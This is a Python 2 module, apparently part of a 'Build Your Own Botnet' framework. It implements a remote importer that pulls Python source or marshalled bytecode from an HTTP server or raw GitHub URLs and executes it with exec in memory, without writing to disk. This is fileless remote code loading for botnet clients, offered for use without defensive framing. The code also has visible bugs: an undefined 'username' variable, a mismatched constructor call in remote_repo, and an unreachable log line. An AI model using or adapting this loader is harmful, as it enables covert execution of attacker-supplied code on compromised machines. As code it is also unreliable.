#!/usr/bin/python
# -*- coding: utf-8 -*-
'Remote Importer (Build Your Own Botnet)'

# standard library
import os
import sys
import imp
import marshal
import logging
import urllib2
import threading
import contextlib

# main
class RemoteImporter():
    """ 
    A remote importer object which can be added to `sys.meta_path`
    to enable clients to directly import missing packages/modules
    remotely from the server.
    
    """
    global _debugger

    def __init__(self, modules, base_url='http://localhost:8000'):
        """ 
        Create a new Remote Importer instance

        `Required`
        :param list modules:     list of packages or module names 
        :param str base_url:     base URL of the server

        `Optional`
        :param bool verbose:     enable/disable verbose output  

        """
        self.base_url     = base_url + '/'
        self.non_source   = False
        self.module_names = []
        self._fetch_names(modules, base_url)

    def _fetch_names(self, modules, base_url):
        _debugger.info('[*] URL is %s' % base_url)
        base  = urllib2.urlparse.urlsplit(base_url).path.strip('/').replace('/','.')
        if base in modules:
            names = [line.rpartition('</a>')[0].rpartition('>')[2].strip('/') for line in urllib2.urlopen(base_url).read().splitlines() if 'href' in line if '</a>' in line if '__init__.py' not in line]
            for n in names:
                name, ext = os.path.splitext(n)
                if ext in ('.py','.pyc'):
                    module = '.'.join((base, name)) if base else name
                    if module not in self.module_names:
                        _debugger.info("[+] Adding %s to module names" % module)
                        self.module_names.append(module)
                elif not len(ext):
                    t = threading.Thread(target=self._fetch_names, args=(modules, '/'.join((base_url, n))))
                    t.daemon = True
                    t.start()

    def _fetch_compiled(self, url) :
        module_src = None
        try :
            module_compiled = urllib2.urlopen(url + 'c').read()
            try :
                module_src = marshal.loads(module_compiled[8:])
                return module_src
            except ValueError :
                pass
            try :
                module_src = marshal.loads(module_compiled[12:])
                return module_src
            except ValueError :
                pass
        except IOError as e:
            _debugger.debug("[-] No compiled version ('.pyc') for '%s' module found!" % url.split('/')[-1])
        return module_src

    def find_module(self, fullname, path=None):
        """ 
        Find a module/package on the server if it exists

        `Required`
        :param str fullname:    full package name

        `Optional`
        :param str path:        remote path to search

        """
        _debugger.debug("[!] Searching for %s" % fullname)
        _debugger.debug("[!] Path is %s" % path)
        module_names = list(self.module_names) + [str(_).split('.')[0] for _ in self.module_names]
        if str(fullname).split('.')[0] not in module_names:
            _debugger.debug("[-] Not found!")
            return None
        _debugger.debug("[@] Checking if built-in >")
        try:
            loader = imp.find_module(fullname, path)
            if loader:
                return None
                _debugger.info("[-] Found locally!")
        except ImportError:
            pass
        _debugger.debug("[@] Checking if it is name repetition >")
        if fullname.split('.').count(fullname.split('.')[-1]) > 1:
            _debugger.info("[-] Found locally!")
            return None
        _debugger.info("[*] Module/Package '%s' can be loaded!" % fullname)
        return self

    def load_module(self, name):
        """ 
        Load a module/package into memory where it can be
        directly imported into the currently running process
        without downloading or installing 

        `Required`
        :param str name:    name of the module/package to load

        """
        imp.acquire_lock()
        _debugger.info("[+] Loading %s" % name)
        if name in sys.modules:
            _debugger.debug('[+] Module "%s" already loaded!' % name)
            imp.release_lock()
            return sys.modules[name]
        if name.split('.')[-1] in sys.modules:
            imp.release_lock()
            _debugger.info('[+] Module "%s" loaded as a top level module!' % name)
            return sys.modules[name.split('.')[-1]]
        module_url  = self.base_url + '%s.py' % name.replace('.', '/')
        package_url = self.base_url + '%s/__init__.py' % name.replace('.', '/')
        zip_url     = self.base_url + '%s.zip' % name.replace('.', '/')
        final_url   = None
        final_src   = None
        try:
            _debugger.info("[+] Trying to import as package from: '%s'" % package_url)
            package_src = None
            if self.non_source:
                package_src = self._fetch_compiled(package_url)
            if not package_src:
                package_src = urllib2.urlopen(package_url).read()
            final_src = package_src
            final_url = package_url
        except IOError as e:
            package_src = None
            _debugger.info("[-] '%s' is not a package:" % name)
        if final_src == None:
            try:
                _debugger.info("[+] Trying to import as module from: '%s'" % module_url)
                module_src = None
                if self.non_source :
                    module_src = self._fetch_compiled(module_url)
                if not module_src:
                    module_src = urllib2.urlopen(module_url).read()
                final_src = module_src
                final_url = module_url
            except IOError as e:
                module_src = None
                _debugger.debug("[!] '%s' not found in HTTP repository. Moving to next Finder." % name)
                imp.release_lock()
                return None
        _debugger.info("[+] Importing '%s'" % name)
        mod = imp.new_module(name)
        mod.__loader__ = self
        mod.__file__   = final_url
        if not package_src:
            mod.__package__ = name
        else:
            mod.__package__ = name.split('.')[0]
        mod.__path__ = ['/'.join(mod.__file__.split('/')[:-1]) + '/']
        _debugger.debug("[+] Ready to execute '%s' code" % name)
        exec final_src in mod.__dict__
        sys.modules[name] = mod
        _debugger.info("[+] '%s' imported succesfully!" % name)
        imp.release_lock()
        return mod

@contextlib.contextmanager
def remote_repo(base_url='http://localhost:8000/'):
    """ 
    Context manager object to add a Remote Importer object 
    to `sys.meta_path`, enabling direct remote imports,
    then remove the instance from `sys.meta_path`
    
    """
    remote_importer = RemoteImporter(base_url)
    sys.meta_path.append(remote_importer)
    yield
    for importer in sys.meta_path:
        if importer.base_url[:-1] == base_url:
            sys.meta_path.remove(importer)

def remote_import(modules, base_url='http://localhost:8000'):
    """ 
    Use a remote_repo object to remotely import 
    packages/modules from the server directly
    into the currently running process without
    touching the disk

    `Requires`
    :param list modules:    list of packages/modules to import

    `Optional`
    :param str base_url:    base URL of server hosting modules

    """
    global _debugger
    if not base_url.startswith('http'):
        raise ValueError("argument 'base_url' must start with http:// or https://")
    with remote_repo(base_url):
        for module in modules:
            try:
                exec "import %s" % module in globals()
            except ImportError as e:
                _debugger.debug(e)
    return {module: globals().get(module) for module in modules}

def github_import(user, repo, branch='master', modules=None, commit=None):
    """ 
    Use a github_repo object to remotely import 
    packages/modules from the server directly
    into the currently running process without
    touching the disk

    `Requires`
    :param str user:        github username
    :param str repo:        github repository name

    `Optional`
    :param str branch:      github repository branch
    :param str module:      github repository module
    :param str commit:      github repository commit

    """
    global _debugger
    if username == None or repo == None:
        raise Exception("arguments 'username' and 'repo' are required")
    if commit and branch:
        raise Exception("arguments 'branch' and 'commit' are mutually exclusive")
    if commit:
        branch = commit
    if not modules:
        modules = [repo]
    base_url = 'https://raw.githubusercontent.com/{user}/{repo}/{branch}/'.format(user=username, repo=repo, branch=branch)
    with remote_repo(base_url):
        for module in modules:
            try:
                exec "import %s" % module in globals()
                return globals()[module]
            except ImportError as e:
                _debugger.debug(e)
